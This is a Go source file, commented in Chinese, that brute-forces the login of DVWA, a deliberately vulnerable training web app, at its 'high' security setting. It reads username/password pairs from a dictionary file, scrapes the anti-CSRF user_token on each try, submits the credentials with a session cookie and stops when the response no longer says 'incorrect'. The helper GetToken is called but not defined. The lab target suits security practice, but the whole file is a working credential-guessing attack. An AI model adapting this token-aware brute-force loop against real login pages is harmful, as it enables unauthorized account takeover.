package main

import (
	"fmt"
    "strings"
    "io/ioutil"
	"net/http"
	"os"
	"io"
	"bufio"
)


// 带cookie和token，进行爆破
func BfWithCookie(cookstr string,fuckurl string,username string,password string) bool {
	client := &http.Client{};
	reqest, err := http.NewRequest("GET", fuckurl, nil)
	if err != nil{
		return false
	}
	cookie2 := &http.Cookie{Name:"PHPSESSID",Value:cookstr,HttpOnly:true};
	cookie3 := &http.Cookie{Name:"security",Value:"high",HttpOnly:true};
	reqest.AddCookie(cookie2)
	reqest.AddCookie(cookie3)

	resp1,err := client.Do(reqest);
	if err != nil{
		return false
	}
	defer resp1.Body.Close()
	content1,_ := ioutil.ReadAll(resp1.Body)
	tokenfk := GetToken(string(content1))
	fuckurl2 := fuckurl + "?username="+username+"&password="+password+"&Login=Login&user_token="+tokenfk
	reqest2, err := http.NewRequest("GET", fuckurl2,nil)
	if err != nil{
		return false
	}
	reqest2.AddCookie(cookie2)
	reqest2.AddCookie(cookie3)
	resp2,err := client.Do(reqest2);
	body, err := ioutil.ReadAll(resp2.Body)
    if err != nil {
        return false
    }
	bd := string(body)
	if strings.LastIndex(bd, "incorrect") == -1{
		return true
	}
	return false
} 


//读取字典文件，进行爆破
func ExcBrute(dictPath string,cookie string,urlDVWA string)  {
	urlDVWABrute := urlDVWA + "vulnerabilities/brute/"
   	file, err := os.OpenFile(dictPath, os.O_RDWR, 0666)
   	if err != nil {
      	fmt.Println("Open file error!", err)
      	return
   	}
	defer file.Close()
	   
	buf := bufio.NewReader(file)
	
	count := 1
   	for {
      	line, err := buf.ReadString('\n')
		line = strings.TrimSpace(line)
		kv := strings.Split(line, " ")
		fmt.Printf("test%d:\nusername:%s\npassword:%s\n\n",count,kv[0],kv[1])
		count++
		if BfWithCookie(cookie,urlDVWABrute,kv[0],kv[1]) == true{
			fmt.Println("Success!")
			break
		}
      	if err != nil {
         	if err == io.EOF {
            	fmt.Println("no pattern!")
            	break
         	} else {
            	fmt.Println("error!", err)
            	return
         	}
      	}
   	}
}